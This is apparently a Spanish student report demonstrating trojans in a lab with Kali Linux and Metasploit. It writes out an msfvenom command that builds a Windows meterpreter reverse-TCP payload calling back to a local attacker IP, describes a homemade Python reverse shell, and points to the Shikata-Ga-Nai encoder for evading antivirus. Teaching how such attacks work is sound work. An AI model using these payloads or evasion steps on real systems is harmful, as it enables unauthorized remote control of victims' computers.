# Demostración práctica: Troyanos
Aun siendo este trabajo eminentemente práctico hemos querido preparar una demostración práctica que sustente lo ya expuesto. Ya que los términos en los que hemos discutido los conceptos anteriores han sido de carácter general hemos optado por hacer lo mismo en esta demostración. Esto es, en vez de buscar un ataque tremendamente específico hemos escogido uno sencillo que nos permita analizar la base teórica de la que hacen uso de una manera clara y concisa.

Con el objetivo de arrojar incluso más luz sobre el malware oculto en general y los troyanos en particular decidimos incluso preparar nuestra propia versión con el objetivo de asentar los conocimientos adquiridos a la vez que relacionábamos el contenido de esta asignatura con el de otras impartidas en el grado.

Creemos que con lo anterior hemos logrado demostrar las características básicas de este tipo de ataques que suelen ser, además, el primer paso en una cadena mucho más compleja.

## Trabajando con Kali
Nuestro objetivo con esta sección no es solo analizar el funcionamiento de los troyanos sino también brindar una pequeña "guía" que permita a cualquiera recrear nuestras pruebas. Es por ello que es necesario describir el sistema con el que se ha generado todo.

Dadas las facilidades que nos ofrece hemos escogido Kali Linux para generar los payloads (más sobre ellos a continuación) y controlar las máquinas comprometidas. Kali es una distribución que usa Linux como kernel y que se basa en el archiconocida Debian. Sobre esta base robusta se ha instalado una gran cantidad de herramientas comunmente empleadas en muchas áreas de la ciberseguridad como puede sern la ingeniería social, la ruptura de contraseñas, auditoría de redes WiFi... En nuestro caso estamos interesados en Metasploit y sus programas relacionados. Metasploit es un framework que nos permite generar ataques contra vulnerabilidades conocidas de una manera clar y rápida. Dado el soporte que ofrece la firma Rapid7, afincada en Boston, nuevas vulnerabilidades y los ataques que las aprovechan se añaden de manera continua. En definitiva, es una herramienta que permite preparar ataques de una manera rápida y que además ofrece una forma clara de continuar con la post-explotación una vez hemos conseguido acceder a la máquina víctima.

Si bien Metasploit es una herramienta tremendamente potente nosotros solo hemos arañado la superficie de la funcionalidad que nos ofrece. En nuestro caso haremos uso del intérprete de órdenes msfconsole y del generador de payloads msfvenom. Ambas herramientas se encuentran instaladas por defecto con lo que no nos las tendremos que ver con la compilación de una suite de herramientas tan extensa...

## Terminología y fases del ataque
Tras haberlo mencionado varias veces creemos que es el momento de esclarecer el significado del payload. El término payload es un anglicismo al que en español nos solemos referir como carga útil en el contexto de las redes que es en el que nos hemos formado. En este ámbito el payload es código que, de ser ejecutado, nos brinda acceso al sistema objetivo. Quizá lo más importante de esta última oración es la palabra "ejecutado". Si bien el payload es el paso anterior a conseguir el acceso que buscamos no vale de nada que esté almacenado en disco; necesitamos que de alguna manera se ejecute.

Para lograr esta ejecución de código arbitraria tenemos que sacar partido a alguna vulnerabilidad. Estas vulnerabilidades son errores en programas o interacciones entre partes del sistema que pueden ser aprovechadas para llevar a cabo acciones a priori no permitidas. La vulnerabilidad por si sola no implica nada, simplemente está ahí, esperando a ser arreglada mediante una actualización. Los atacantes sin embargo intentarán aprovecharla para lograr sus objetivos. En nuestro caso, la ejecución del payload que hemos preparado.

La forma de aprovechar la vulnerabilidad es a través de un exploit. Este exploit suele ser un programa que toma acciones para intentar aprovechar una vulnerabilidad determinada. Teniendo en cuenta la relación entre vulnerabilidades y exploits aprovechamos para señalar por qué es tan importante trabajar con equipos actualizados. Además de funcionalidades nuevas las actualizaciones se encargan de "parchear" vulnerabilidades que se han encontrado para evitar que puedan ser aprovechadas...

En nuestro caso estamos interesados en analizar lo que ocurre una vez se ejecuta el payload, no en la forma de lograrlo. Si aplicamos estos conceptos a raja tabla, en nuestro caso el exploit es el usuario, es quien va a ejecutar el programa que nos dará acceso a su sistema. Una vez analizado el funcionamiento de nuestro troyano entraremos a explicar una forma en la que podemos explotar el lector de PDFs Adobe Acrobat Reader para que no dependamos de el usuario. Creemos que al posponer esta explicación conseguiremos centrar la atención en el malware propiamente dicho mientras que, dada la independencia entre las fases del ataque, no dificultamos seguir esta demostración.

De la discusión anterior se desgrana el proceso común de ataque a un sistema víctima:

- Generar el payload que deseamos ejecutar en la víctima
- Encontrar una vulnerabilidad que podamos aprovechar
- Ejecutar el exploit que saque partido a esa vulnerabilidad para lograr ejecutar el payload
- Ejecutar el payload generado en la víctima para conseguir, en nuestro caso, acceso al sistema
- Emplear el acceso al sistema para lo que se desee: escalada de privilegios, conseguir información...

Con este esquema claro pasamos a detallar cada una de las partes.

## Generando el payload: MSFVENOM
Para facilitar la comprensión de este paso podemos aludir a la formación que hemos adquirido en asignaturas como Sistemas Operativos o Programación en las que estudiamos el proceso que nos lleva desde un archivo fuente *.c a un ejecutable compilado. De manera muy resumida podemos decir que el código fuente pasa por el preprocesador que sustituirá todas las directivas #include <>. A continuación el archivo resultante pasa por el compilador que se encargará de generar archivos objeto *.o para después enlazarlo junto con los demás gracias al enlazador. Tras este último paso llegamos a nuestro ejecutable funcional.

Si observamos este ejecutable con una herramienta como xxd solo veremos una ristra de bytes comprensibles por nuestro equipo, el denominado código máquina. Ahora, si hacemos lo propio con los payloads generados por MSFVENOM veremos que, en efecto, es análogo a un programa compilado. Con esto queremos demostrar que MSFVENOM simplemente nos devuelve ejecutables ya generados. Nosotros podremos controlar qué tipo de payload queremos pero, al final del día, simplemente se nos devuelve un programa listo para ejecutar.

Si bien los lenguajes interpretados como Python están cobrando cada vez más notoriedad en el mundo actual no debemos olvidarnos de las sutilezas que entraña la compilación de programas. Los sistemas operativos se caracterizan por una serie de parámetros como son el kernel o núcleo que emplean o la arquitectura para la que están diseñados. Esto implica que programas generados para una plataforma que se sustente sobre Linux no son compatibles con otros que corran sobre Windows NT, el kernel del sistema operativo homónimo. Bien es verad que existen interfaces del sistema operativo estñandar como POSIX pero no podemos aventurarnos a asegurar que un programa escrito para Windows corra en otro basado en Linux y viceveresa. Lo que es más, dentro de cada una de las familias anteriores distinguimos arquitecturas impuestas por las características físicas de la máquina, siendo las más típicas la de 64 bits (amd64/x64) y la ya algo obsoleta de 32 bits (i386/x86). Al igual que antes un programa compilado para una arquitectura no será compatible con la otra.

Teniendo en cuenta las variables que hemos descrito llegamos a que podemos generar 4 tipos de payloads en función del objetivo que tengamos. Estas 4 variables son:

- Linux - 64 bits
- Linux - 32 bits
- Windows - 64 bits
- Windows - 32 bits

Con esto en mente debemos alterar la salida que nos ofrece MSFVENOM a través de sus opciones para generer el payload deseado. Con el fin de ocultar la complejidad de usar la herramienta directamente hemos escrito un script de bash (la shell por defecto de Kali y otras muchas distribuciones) que se encarga de esto por nosotros. El script en cuestión es `gen_payload.sh`. No obstante, adjuntamos una invocación de ejemplo de MSFVENOM para comentar qué efecto tiene cada una de sus opciones:

```bash
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=5000 -f exe -o win_pyld.exe
```

Con lo anterior estamos generando el payload `win_pyld.exe`. La arquitectura y plataforma de este programa vienen dadas por las opciones `-a` y `--platform` respectivamente. Consultando los valores pasados vemos que se trata de una máquina que ejecuta la versión de 64 bits de Windows. Asimismo, el tipo de payload seleccionado es `windows/x64/meterpreter/reverse_tcp`. En la siguiente sección comentaremos el funcionamiento de la misma. Dado el payload escogido debemos pasar 2 opciones que se introducirán en el código del mismo. En este caso son la IP (`LHOST`) y el puerto (`LPORT`) de la máquina atacante. En secciones subsiguientes estudiaremos por qué son necesarias estas opciones. Finalmente especificamos el formato del payload generado con la opción `-f`. Dado que el formato estándar de los archivos ejecutables en Windows. Este archivo generado tendrá, ademas del programa propiamente dicho, las instrucciones necesarias para que el loader de Windows lo cargue correctamente.

Como ya comentamos anteriormente, uno de los mecanismos más comunes para detectar malware es la comparación de archivos sospechosos con firmas almacenadas en bases de datos que se han asociado a algún archivo malicioso. Con la orden anterior hemos generado el payload sin intentar ocultarlo de ninguna manera. Más adelante comentaremos como, a traves de un proceso denominado codificación, podemos intentar ocultar este programa malicioso para así inhibir o al menos dificultar el trabajo de los antivirus.

En definitiva, lo que hemos logrado generar es un programa que, de ser ejecutado en la máquina víctima, nos proporcionará acceso desde la máquina atacante.

## Llevando a cabo el ataque
Hasta ahora no hemos explicado qué es lo que hace el payload que estamos generadon. Sabemos que tenemos un programa que, de ejecutarse en la víctima, nos daría acceso a la misma pero desconocemos cómo lo hace.

Gracias al nombre del payload, los parámetros que acepta y la información que nos proporciona un analizador de protocolos como WireShark podemos hacernos una idea de lo que está ocurriendo. El programa generado al ejecutarse simplemente abrirá un socket que utiliza TCP en la capa de transporte (de ahí el sufijo tcp del nombre del payload) y que tratará de conectarse de vuelta a la máquina atacante (de ahí el reverse del nombre). Una vez se establezca la conexión este programa se baja una shell que le suministra el atacante y que pasará a ejecutar en la víctima, cosa que nos brinda acceso al sistema objetivo.

Ahora bien, este payload debe saber cómo conectarse de vuelta a la máquina atacante. Es aquí donde entran en juego las opciones `LHOST` y `LPORT` que se encargan de identificar a la máquina atacante a través de su dirección IP (`LHOST`) así como al programa que espera recibir la conexión del payload a través de un número de puerto (`LPORT`). En el fondo este payload resulta ser, desde un punto de vista general, tremendamente sencillo.

Una vez que se haya ejecutado el programa malicioso en la víctima debemos aceptar la conexión de vuelta y poner todo a funcionar. Para ello haremos uso de la consola de metasploit a través del comando `msfconsole`. Debemos configurar nuestra sesión para que acepte la conexión que esperamos y descargue a través de ésta la shell que deseamos ejecutar en la máquina atacante. Al fin y al cabo lo que queremos lograr es tener una sesión en la víctima que nos permita controlarla.

Al igual que hicimos con la generación del payload hemos automatizado el proceso a través de un script en bash que está enteramente comentado (troj_c_n_c.sh). Tras lanzarlo esperaremos la conexión del payload una vez se ejecute y pasaremos a tener automáticamente un indcutor (prompt) esperando órdenes para ejecutar en la víctima.

Si bien tenemos shells tradicionales como bash, zsh o ksh en este caso estamos tratando con un entorno totalmente distinto. Si recordamos el nombre del payload y nos quemos con la última parte (`meterpreter/reverse_tcp`) veremos que nuestro payload se puede desglosar en 2 partes:

- Stager: reverse_tcp -- Se encarga de la conexión de vuelta a la máquina atacante
- Stage: meterpreter -- Shell a ejecutar

Vemos pues que el inductor que aparece en el atacante pertence a esta shell. La forma de cargar esta shell en memoria es a través de la inyección del código descargado en el espacio de memoria del proceso que ya generó la conexión de vuelta. Es decir, en una primera instance el stager se conecta de vuelta al cenctro de control (máquina atacante). Al ejecutarse este payload se genera un proceso, como en cualquier otra ocasión. Tras descargarse el código compilado de meterpreter éste se carga en el espacio de memoria del proceso y pasamos a ejecutar la shell que recibimos de vuelta.

Vemos pues quel el proceso implica una serie de pasos a pesar de ser relativamente sencillo. Al tratarse de un entorno totalmente nuevo tenemos una gran cantidad de herramientas y órdenas que nos permitirán recabar la información que estemos buscando.

Como ya dijimos antes, consideramos el caso en el que el usuario ejecuta directamente nuestro programa ya sea por desconocimiento, valentía o inconsciencia. Esto implica normalmente que no tendremos permisos administrativos, es decir, podremos hacer tanto como podríamos con una cuenta de usuario normal y corriente. Esto abre la puerta a las etapas posteriores tras la entrada en el sistema: la post-explotación. Una vía de acción típica es el escalado de privilegios para lograr el control total de la víctima, por ejemplo. Dado que no es el tema que nos atañe lamentamos tener que dejarlo aquí...

## Nuestra propia versión
Tras analizar el funcionamiento de la solución ofrecida por Metasploit nos decidimos a intententar algo parecido con un programa propio. Dada la facilidad que ofrece al desarrollo optamos por emplear Python como lenguaje para implementar nuestra propuesta. Somos conscientes de que lo que hemos escrito es mucho menos sofisticado que lo que podemos lograr con Metasploit pero queríamos llevar a cabo nuestra propia prueba de concepto.

En vez de intentar cargar un entorno nuevo a través de la conexión que hacemos de vuelta al centro de control hemos optado por emplear la shell del propio sistema. Para ello hacemos uso de la librería `subprocess` que nos permite inspeccionar la salida de comandos del sistema. La arquitectura de nuestro programa es por tanto muy sencilla. El payload solo se encarga de abrir una conexión TCP hasta el atacante y espera a recibir comandos. Al recibirlos los ejecuta en la víctima para devolver la salida de los mismos al centro de control. El proceso continúa hasta que uno de los dos programas muere, lo que precipita el cierre de la conexión.

Asimismo hemos optado por encriptar las comunicaciones con un método muy simple. La salida de los comandos ejecutados en la víctima se devuelven como texto plano al atacante y por tanto podrían ser leídas por cualquiera. Nosotros hemos decidido hacer un one-time pad con el texto para evitar en la medida de lo posible este efecto. Para lograr el secreto perfecto deberíamos tener una clave tan larga como el texto claro a cifrar y dada la naturaleza interactiva de la sesión esto supone una gran dificultad... Es por ello que reutilizamos cíclicamente la clave, cosa que debilia la encriptación. Asimismo esta clave se distribuye como una colección de bytes "hardcodeada" en el programa con lo que si alguien consultara las fuentes podría obtenerela... Reiteramos pues que estamos tratando de llevar a cabo una prueba de concepto y que esto no es, bajo ningún concepto, una implementación robusta.

## Esquivando a los antivirus
Antes ya adelantábamos cómo uno de los métodos típicos de detección de malware es la comparación con otras muestras maliciosas conocidas. En un intento de camuflar programas maliciosos podemos tratar de ofuscarlos, esto es, enredar tanto el código que la similitud con otras muestras conocidas se reduzca enormemente. Para ello contamos con herramientas como los codificadores o encoders. Uno de los ejemplos más conocidos es `Shikata-Ga-Nai` que significa "no se puede hacer nada" en japonés, aludiendo a cómo complica la detección del malware codificado por parte de programas especializados.